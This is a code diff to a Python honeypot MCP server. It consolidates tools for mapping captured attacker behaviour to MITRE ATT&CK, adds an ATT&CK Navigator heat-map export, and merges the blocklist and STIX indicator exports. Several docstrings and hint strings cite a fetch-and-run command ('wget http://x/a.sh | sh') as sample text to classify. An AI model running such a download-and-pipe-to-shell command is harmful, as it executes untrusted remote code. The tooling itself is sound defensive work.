@@ -316,33 +316,13 @@ _TTP_EVIDENCE_SHOWN = 3
 _TTP_EVIDENCE_CHARS = 80
 
 
-@mcp.tool(**hints("map_ttps"))
-async def map_ttps(
-    ip: str | None = None,
-    event_types: list[str] | None = None,
-    raw_text: str | None = None,
+async def _map_ttps(
+    ip: str | None, event_types: list[str] | None, raw_text: str | None
 ) -> dict[str, Any]:
-    """Which MITRE ATT&CK techniques does this behaviour correspond to?
-
-    Use it for "what techniques did 203.0.113.7 use", "map ssh_login_failed to ATT&CK", "what is
-    `wget http://x/a.sh | sh` in ATT&CK terms". Give at least one input; each technique comes
-    with the evidence that matched. For the whole capture use `attack_summary`.
-
-    Args:
-        ip: A source address; its most recent 200 alerts are read, event types and captured text.
-        event_types: Event type names to map, e.g. ["ssh_login_failed", "http_exploit_attempt"].
-        raw_text: Any text to scan, such as a command line or a log excerpt.
-    """
+    """ATT&CK techniques, with evidence, for one address, some event types or some text."""
     from honeypot_mcp.intel.mitre import map_to_attack
     from honeypot_mcp.tools._planted import load_planted
 
-    if not (ip or event_types or raw_text):
-        return {
-            "error": "Nothing to map: give an ip, event_types or raw_text.",
-            "hint": 'For example ip="203.0.113.7", or event_types=["ssh_login_failed"], or '
-            'raw_text="wget http://example.test/a.sh | sh". Use `attack_summary` for everything '
-            "captured.",
-        }
     terms: list[str] = list(event_types or [])
     basis = ["event_types"] if event_types else []
 
@@ -391,17 +371,29 @@ _ATTACK_UNMAPPED_SHOWN = 10
 
 
 @mcp.tool(**hints("attack_summary"))
-async def attack_summary(since_hours: float | None = None) -> dict[str, Any]:
-    """Which ATT&CK tactics and techniques has the whole capture shown, and how often?
+async def attack_summary(
+    since_hours: float | None = None,
+    ip: str | None = None,
+    event_types: list[str] | None = None,
+    raw_text: str | None = None,
+) -> dict[str, Any]:
+    """Which ATT&CK tactics and techniques has the capture shown, or does this behaviour match?
 
-    Use it for "what techniques are we seeing", "ATT&CK breakdown for this week", "how much of
-    our traffic maps to ATT&CK". Exact counts per tactic and technique with the event types
-    behind each, plus the share that maps at all. For one address or one piece of text use
-    `map_ttps`. Argument is optional.
+    Use it for "what techniques are we seeing", "ATT&CK breakdown for this week", "what techniques
+    did 203.0.113.7 use", "what is `wget http://x/a.sh | sh` in ATT&CK terms". With no ip,
+    event_types or raw_text: exact counts per tactic and technique for the whole capture, with the
+    event types behind each and the share that maps at all. With any of them: the techniques that
+    input matches, each with the evidence.
 
     Args:
-        since_hours: Only the last N hours ("today" 24, "this week" 168). Default: everything.
+        since_hours: Only the last N hours ("today" 24, "this week" 168); whole-capture summary
+            only. Default: everything.
+        ip: A source address; its most recent 200 alerts are read, event types and captured text.
+        event_types: Event type names to map, e.g. ["ssh_login_failed", "http_exploit_attempt"].
+        raw_text: Any text to scan, such as a command line or a log excerpt.
     """
+    if ip or event_types or raw_text:
+        return await _map_ttps(ip, event_types, raw_text)
 
     from honeypot_mcp.intel.mitre import TACTIC_ORDER, map_to_attack
 
@@ -484,7 +476,7 @@ async def attack_summary(since_hours: float | None = None) -> dict[str, Any]:
             "No alerts in this window. Try a longer one, or omit since_hours."
             if not total
             else "Unmapped event types are connection/session bookkeeping or generic command "
-            "carriers whose technique comes from the payload (use map_ttps with an ip for that). "
+            "carriers whose technique comes from the payload (give an ip for that). "
             f"Each technique lists its {_ATTACK_TYPES_SHOWN} biggest event types."
         ),
     }
@@ -540,7 +532,7 @@ async def write_report(
     """Write the report file; `generate_report` is this with an automatic title and file name."""
     from honeypot_mcp.analysis.reporter import generate
 
-    extension = "html" if format == "html" else "md"
+    extension = {"html": "html", "attack_navigator": "json"}.get(format, "md")
     if output_path and not output_path.lower().endswith(f".{extension}"):
         return {
             "error": (
@@ -550,6 +542,14 @@ async def write_report(
             ),
             "hint": f"Name the file ending in .{extension}, or omit output_path.",
         }
+    if format == "attack_navigator":
+        from honeypot_mcp.tools.ioc import write_navigator_layer
+
+        layer = await write_navigator_layer(since_hours, output_path)
+        if ip and "error" not in layer:
+            ignored = f"ip ({ip}) was ignored: the Navigator layer covers all activity."
+            layer["note"] = f"{layer['note']} {ignored}" if layer.get("note") else ignored
+        return layer
     if ip and (err := validate_ip(ip)):
         return {"error": err, "hint": "Pass an address like 203.0.113.7, or omit ip."}
     ip = ip.strip() if ip else ip
@@ -655,19 +655,20 @@ async def write_report(
 async def generate_report(
     ip: str | None = None,
     since_hours: float | None = None,
-    format: Literal["html", "markdown"] = "html",
+    format: Literal["html", "markdown", "attack_navigator"] = "html",
 ) -> dict[str, Any]:
-    """Write an attack report (timeline, top attackers, ATT&CK techniques) to a file.
+    """Write an attack report or ATT&CK Navigator heat map (techniques by alert count) to a file.
 
-    Use it for "write me a report", "weekly summary as markdown", "report on 203.0.113.7". Saves
-    a new file with an automatic name and title and returns its path with the headline figures;
-    the report itself is not printed. With an address it adds reputation and a risk score, which
-    sends that address to the configured threat-intel services.
+    Use it for "write me a report", "weekly summary as markdown", "report on 203.0.113.7", "ATT&CK
+    heat map for the Navigator". Saves a new file with an automatic name and returns its path with
+    the headline figures; the report is not printed. With an address it adds reputation and a risk
+    score, which sends that address to the configured threat-intel services.
 
     Args:
-        ip: Report on this source address only. Default: all activity.
+        ip: Report on this source address only. Default: all activity. Ignored for attack_navigator.
         since_hours: Only the last N hours ("today" 24, "this week" 168). Default: everything.
-        format: html (default) or markdown.
+        format: html (default), markdown, or attack_navigator (a MITRE ATT&CK Navigator layer
+            JSON scored by alert count; open it at mitre-attack.github.io/attack-navigator).
     """
     return await write_report(None, ip, format, since_hours)
 
@@ -1388,9 +1389,9 @@ def _usable_offenders(
     # server's own canary address). A ready-made `iptables -A INPUT -s <ip> -j
     # DROP` file is exactly as dangerous as a push if it contains the operator's
     # own gateway. A malformed allowlist raises ValueError, as it does for pushes.
-    from honeypot_mcp.tools.blocklist_push import _never_push
+    from honeypot_mcp.tools._never_block import never_block_networks
 
-    never = _never_push()
+    never = never_block_networks()
     usable: list[tuple[ipaddress.IPv4Address | ipaddress.IPv6Address, int]] = []
     for raw, count in offenders:
         try:
@@ -1442,7 +1443,7 @@ async def _offenders_for_export(hours: int, min_hits: int) -> dict[str, Any] | l
 async def write_blocklist(
     format: str, hours: int, min_hits: int, output_path: str | None = None
 ) -> dict[str, Any]:
-    """Write the blocklist file; `export_blocklist` is this with an automatic file name."""
+    """Write the blocklist file; `export_indicators` is this with an automatic file name."""
     found = await _offenders_for_export(hours, min_hits)
     if isinstance(found, dict):
         return found
@@ -1492,33 +1493,35 @@ async def write_blocklist(
     )
 
 
-@mcp.tool(auth=require_role("operator"), **hints("export_blocklist"))
-async def export_blocklist(
-    format: Literal["plain", "iptables", "fail2ban", "cidr"] = "plain",
+@mcp.tool(auth=require_role("operator"), **hints("export_indicators"))
+async def export_indicators(
+    format: Literal["plain", "iptables", "fail2ban", "cidr", "stix"] = "plain",
     hours: int = 24,
-    min_hits: int = 5,
+    min_hits: int | None = None,
 ) -> dict[str, Any]:
-    """Write a blocklist file of the addresses that attacked us, for a firewall or fail2ban.
+    """Write a file of the addresses that attacked us, for a firewall, fail2ban or a TIP/MISP.
 
-    Use it for "give me a blocklist", "iptables rules for everyone who hit us today", "block
-    anything with 100+ hits". Saves a new file and returns its path, the count and the top
-    offenders; the list itself can be long, so it is not printed. Only public addresses; never
-    your allowlisted ones.
+    Use it for "give me a blocklist", "iptables rules for everyone who hit us today", "export our
+    indicators as STIX". Saves a new file and returns its path and count (plus top offenders for
+    the blocklist formats); the list can be long, so it is not printed. Only public addresses;
+    never your allowlisted ones.
 
     Args:
-        format: plain (one address per line, the default), iptables (DROP rules), fail2ban, or
-            cidr (each address as /32 or /128).
+        format: plain (one address per line, the default), iptables (DROP rules), fail2ban, cidr
+            (each address as /32 or /128), or stix (a STIX 2.1 bundle).
         hours: Count alerts from the last N hours ("today" 24, "this week" 168). Default 24.
         min_hits: List only addresses with at least this many alerts ("100+ hits" is 100).
-            Default 5.
+            Default 5, or 1 for stix.
     """
-    return await write_blocklist(format, hours, min_hits)
+    if format == "stix":
+        return await write_stix_bundle(hours, 1 if min_hits is None else min_hits)
+    return await write_blocklist(format, hours, 5 if min_hits is None else min_hits)
 
 
 async def write_stix_bundle(
     hours: int, min_hits: int, output_path: str | None = None
 ) -> dict[str, Any]:
-    """Write the STIX bundle file; `export_stix` is this with an automatic file name."""
+    """Write the STIX bundle file; `export_indicators` is this with an automatic file name."""
     import json
     import uuid
 
@@ -1567,21 +1570,6 @@ async def write_stix_bundle(
             "so the bundle is empty. Try a longer window or a lower min_hits."
         )
     return await annotate_window(result)
-
-
-@mcp.tool(auth=require_role("operator"), **hints("export_stix"))
-async def export_stix(hours: int = 24, min_hits: int = 1) -> dict[str, Any]:
-    """Write a STIX 2.1 file of the attacker addresses, to share with another team or a TIP/MISP.
-
-    Use it for "export our indicators as STIX", "STIX bundle of this week's attackers". Saves a
-    new file and returns its path and the number of indicators; the bundle is too large to print.
-    Only public addresses.
-
-    Args:
-        hours: Include addresses seen in the last N hours ("today" 24, "this week" 168). Default 24.
-        min_hits: Only addresses with at least this many alerts. Default 1.
-    """
-    return await write_stix_bundle(hours, min_hits)
 
 
 # The newest rows a timeline reads, and the most entries (one entry = a run of the same source and
